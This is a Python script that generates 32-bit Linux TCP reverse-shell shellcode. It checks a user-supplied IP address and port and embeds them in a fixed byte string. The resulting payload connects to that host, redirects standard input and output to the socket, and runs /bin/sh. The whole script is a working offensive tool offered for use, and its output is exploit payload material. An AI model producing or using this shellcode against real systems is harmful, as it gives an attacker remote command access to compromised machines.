import sys;
import re;

def main():
	if len(sys.argv) != 3:
		print ("Usage: python {0} <IP> <PORT>".format(sys.argv[0]))
		exit()

	ip = sys.argv[1]
	is_valid = re.match("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$", ip)

	if not is_valid:
        	print ("Do you know what IP is?")
        	exit()

	ipNum = ip.split(".")

	try:
		port = int(sys.argv[2])
	except:
		print ("Do you know what port is?")
		exit()

	if port < 1 or port > 65535:
		print ("Go Learn Network Basics!!")
		exit()
	if port < 1024:
		print ("Are you root to listen on {0}?".format(sys.argv[2]))

	hexPort = "{0:#0{1}x}".format(port,6)

	shellcode = ("\\x31\\xc0\\x31\\xdb\\x99\\x52\\x42\\x52\\x42\\x52\\xb0\\x66\\x43\\x89\\xe1\\xcd\\x80\\x68" + 
              "\\x" + "{0:#0{1}x}".format(int(ipNum[0]),4)[-2:] + 
              "\\x" + "{0:#0{1}x}".format(int(ipNum[1]),4)[-2:] + 
              "\\x" + "{0:#0{1}x}".format(int(ipNum[2]),4)[-2:] + 
              "\\x" + "{0:#0{1}x}".format(int(ipNum[3]),4)[-2:] + 
              "\\x66\\x68" + 
              "\\x" + hexPort[-4:-2] + "\\x" + hexPort[-2:] +
              "\\x66\\x52\\x89\\xe1\\x6a\\x10\\x51\\x92\\x52\\xb0\\x66\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x41\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x99\\xcd\\x80")

	print ("Here is your TCP Reverse Shell shellcode\n")
	print (shellcode)

if __name__ == "__main__":
	main()